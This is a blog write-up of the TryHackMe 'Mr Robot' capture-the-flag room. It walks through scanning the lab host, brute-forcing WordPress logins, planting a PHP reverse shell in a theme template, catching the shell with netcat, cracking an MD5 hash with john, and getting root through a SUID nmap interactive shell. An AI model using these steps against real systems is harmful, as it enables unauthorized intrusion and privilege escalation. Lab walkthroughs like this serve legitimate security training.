---
title: "Mr Robot CTF Writeup THM"
description: "My writeup of the TryHackMe room [Mr Robot CTF](https://tryhackme.com/room/mrrobot)"
date: 2024-01-22T16:00:00+01:00
image: https://images.unsplash.com/photo-1582266255765-fa5cf1a1d501?q=80&w=2670&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D
math:
license:
hidden: false
comments: true
draft: false
tags:
    - Linux
    - Privilege Escalation
categories:
    - Room
    - Medium
---

First of all I am going to do an nmap scan:

```bash
nmap -sC -sV -p- 10.10.81.92

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-22 05:44 EST
Nmap scan report for 10.10.81.92
Host is up (0.055s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open   ssl/http Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 123.10 seconds
```

Here we can see port 80 and 443 open.

So I am going to expplore the web page.

![Untitled](https://raw.githubusercontent.com/Blueaulo/MrRobot-writeup-THM/main/10acf195-4b40-4784-b6ca-297837c219bf_Export-7dd7dc58-f580-4cb4-9c34-999e6801e5e5/Mr%20Robot%20CTF%200771358915314dfa9159586ad03a2c0a/Untitled.png)

This is the content of the web page.

From this point I just went and enumerate the webpage.

I also found the robots.txt which leads to the first flag.

inside the robots.txt there is also the location to a dictionary:

```bash
sort Downloads/fsocity.dic | uniq > uniq.txt
```

I ran this command because there were repeated words.

So, now I just need the username.

I tried with wpscan but I got nothing, So I tried to FUZZ the username with the sictionary, which if it is in the wordlist, should get a different response size, because wordpress tells you if is just the password that is wrong.

 And that’s exactly what happened:

![pg](https://raw.githubusercontent.com/Blueaulo/MrRobot-writeup-THM/main/10acf195-4b40-4784-b6ca-297837c219bf_Export-7dd7dc58-f580-4cb4-9c34-999e6801e5e5/Mr%20Robot%20CTF%200771358915314dfa9159586ad03a2c0a/Untitled%201.png)

So, now I think of running the fuzzer again, with the username Elliot and with the dictionary as a password.

And we got the password:



![Untitled](https://raw.githubusercontent.com/Blueaulo/MrRobot-writeup-THM/main/10acf195-4b40-4784-b6ca-297837c219bf_Export-7dd7dc58-f580-4cb4-9c34-999e6801e5e5/Mr%20Robot%20CTF%200771358915314dfa9159586ad03a2c0a/pg.png)

And I got in, from there I could create a reverse shell, but first let’s explore the dashboard.

In the Users section wee see that there is another User:

![Untitled](https://raw.githubusercontent.com/Blueaulo/MrRobot-writeup-THM/main/10acf195-4b40-4784-b6ca-297837c219bf_Export-7dd7dc58-f580-4cb4-9c34-999e6801e5e5/Mr%20Robot%20CTF%200771358915314dfa9159586ad03a2c0a/Untitled%203.png)

Maybe it can be helpful later.

We can create a reverse shell just by copy and paste the pentestermonkey reverse shell, in the 404 template.

![Untitled](https://raw.githubusercontent.com/Blueaulo/MrRobot-writeup-THM/main/10acf195-4b40-4784-b6ca-297837c219bf_Export-7dd7dc58-f580-4cb4-9c34-999e6801e5e5/Mr%20Robot%20CTF%200771358915314dfa9159586ad03a2c0a/Untitled%204.png)

Then start the listener in the machine and we are in:

```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.11.65.91] from (UNKNOWN) [10.10.81.92] 50199
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 12:10:26 up  1:29,  0 users,  load average: 0.00, 0.88, 2.66
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
daemon
```

We have 2 users:

```bash
cat /etc/passwd | grep "home"

syslog:x:101:104::/home/syslog:/bin/false
mysql:x:1001:1001::/home/mysql:
varnish:x:999:999::/home/varnish:
robot:x:1002:1002::/home/robot:
```

We can’t cd into varnish, but we can cd in robot.

in his home we have 2 files:

```bash
ls -la
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

As we can see the first one can be opened only by robot, but the second one can be read by anyone:

```bash
cat password.raw-md5
robot:<redacted>
```

And looks like we got the md5 hash of robot

And we can simply brute force it:

```bash
john --format=Raw-md5 pass.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
<redacted> (robot)
1g 0:00:00:00 DONE (2024-01-22 07:19) 100.0g/s 4051Kp/s 4051Kc/s 4051KC/s bonjour1..123092
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

Using that we can use the command “su” to authenticate ourself as robot:

```bash
su robot
Password: <redacted>
```

```bash
whoami
robot
```

After doing some enumeration, I noticed that we got a strange SUID:



```bash
find / -type f -perm -04000 -ls 2>/dev/null

 15068   44 -rwsr-xr-x   1 root     root        44168 May  7  2014 /bin/ping
 15093   68 -rwsr-xr-x   1 root     root        69120 Feb 12  2015 /bin/umount
 15060   96 -rwsr-xr-x   1 root     root        94792 Feb 12  2015 /bin/mount
 15069   44 -rwsr-xr-x   1 root     root        44680 May  7  2014 /bin/ping6
 15085   40 -rwsr-xr-x   1 root     root        36936 Feb 17  2014 /bin/su
 36231   48 -rwsr-xr-x   1 root     root        47032 Feb 17  2014 /usr/bin/passwd
 36216   32 -rwsr-xr-x   1 root     root        32464 Feb 17  2014 /usr/bin/newgrp
 36041   44 -rwsr-xr-x   1 root     root        41336 Feb 17  2014 /usr/bin/chsh
 36038   48 -rwsr-xr-x   1 root     root        46424 Feb 17  2014 /usr/bin/chfn
 36148   68 -rwsr-xr-x   1 root     root        68152 Feb 17  2014 /usr/bin/gpasswd
 36349  152 -rwsr-xr-x   1 root     root       155008 Mar 12  2015 /usr/bin/sudo
 34835  496 -rwsr-xr-x   1 root     root       504736 Nov 13  2015 /usr/local/bin/nmap
 38768  432 -rwsr-xr-x   1 root     root       440416 May 12  2014 /usr/lib/openssh/ssh-keysign
 38526   12 -rwsr-xr-x   1 root     root        10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
395259   12 -r-sr-xr-x   1 root     root         9532 Nov 13  2015 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
395286   16 -r-sr-xr-x   1 root     root        14320 Nov 13  2015 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
 38505   12 -rwsr-xr-x   1 root     root        10344 Feb 25  2015 /usr/lib/pt_chown
```

Nmap can be used in interactive mode:

```bash
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
# whoami
root
```

And after that we just want to go in the /root directory and retrieve the flag.
